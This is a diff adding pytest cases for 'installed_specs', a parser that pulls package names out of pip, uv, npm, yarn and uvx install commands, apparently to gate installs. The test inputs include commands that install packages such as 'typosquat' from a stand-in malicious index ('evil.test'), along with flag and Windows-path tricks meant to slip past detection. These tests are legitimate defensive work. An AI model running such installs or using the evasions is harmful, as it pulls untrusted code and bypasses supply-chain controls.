@@ -222,6 +222,66 @@ def test_installed_specs_no_false_positive_tokens(command: str, expected: list[s
     assert installed_specs(command) == expected
 
 
+# ── round-3 review: global-flag / Windows-path / boolean-flag evasions ───────────────
+
+
+@pytest.mark.parametrize(
+    ("command", "expected"),
+    [
+        # pip: a value-taking GLOBAL option before the 'install' verb — finding #1
+        ("pip -i https://evil.test/simple install typosquat", ["pypi:typosquat"]),
+        ("pip --index-url https://evil/simple install evil", ["pypi:evil"]),
+        ("pip --timeout 60 install evil", ["pypi:evil"]),
+        ("pip3 --cache-dir /tmp/x install evil", ["pypi:evil"]),
+        ("pipx --python 3.11 install evil", ["pypi:evil"]),
+        # uv: a global flag/option before the subcommand — finding #2
+        ("uv -q add evil", ["pypi:evil"]),
+        ("uv --no-cache add evil", ["pypi:evil"]),
+        ("uv --project . add evil", ["pypi:evil"]),
+        ("uv -q pip install evil", ["pypi:evil"]),
+        ("uv --directory /tmp pip install evil", ["pypi:evil"]),
+        ("uv -q tool install evil", ["pypi:evil"]),
+        # Windows backslash venv/interpreter paths (posix=False) — finding #3
+        (r".venv\Scripts\pip install evil", ["pypi:evil"]),
+        (r"C:\Python311\Scripts\pip.exe install evil", ["pypi:evil"]),
+        (r"C:\Python311\python.exe -m pip install evil", ["pypi:evil"]),
+        # a flag BETWEEN the pip subcommand and 'install' — finding #5
+        ("python -m pip --no-cache-dir install evil", ["pypi:evil"]),
+        ("python -m pip -q install evil", ["pypi:evil"]),
+        ("uv pip --quiet install evil", ["pypi:evil"]),
+        ("uv --quiet pip install evil", ["pypi:evil"]),
+    ],
+)
+def test_installed_specs_detects_global_flag_and_windows_forms(
+    command: str, expected: list[str]
+) -> None:
+    assert installed_specs(command) == expected
+
+
+@pytest.mark.parametrize(
+    ("command", "expected"),
+    [
+        # --save-exact / --prefer-dist are BOOLEAN npm flags — must NOT swallow the package (#4)
+        ("npm install --save-exact evil-pkg", ["npm:evil-pkg"]),
+        ("yarn add --prefer-dist evil-pkg", ["npm:evil-pkg"]),
+        ("npm install --save-exact a b", ["npm:a", "npm:b"]),
+        # uv add group/extra value flags: the GROUP/EXTRA name is not a package (#7)
+        ("uv add --group dev evil", ["pypi:evil"]),
+        ("uv add -G dev evil", ["pypi:evil"]),
+        ("uv add --optional extra evil", ["pypi:evil"]),
+    ],
+)
+def test_installed_specs_boolean_and_group_flags(command: str, expected: list[str]) -> None:
+    assert installed_specs(command) == expected
+
+
+def test_uvx_from_still_gates_the_real_package() -> None:
+    # uvx --from PKG CMD: PKG (the fetched package) must NOT be skipped — gating it is the point.
+    # CMD is over-reported (tighten-only minor), but the real package is never missed (no bypass).
+    specs = installed_specs("uvx --from requests-evil somecli")
+    assert "pypi:requests-evil" in specs
+
+
 def test_normalize_is_pep503() -> None:
     assert normalize("Foo_Bar") == "foo-bar"
     assert normalize("Foo.Bar__Baz") == "foo-bar-baz"
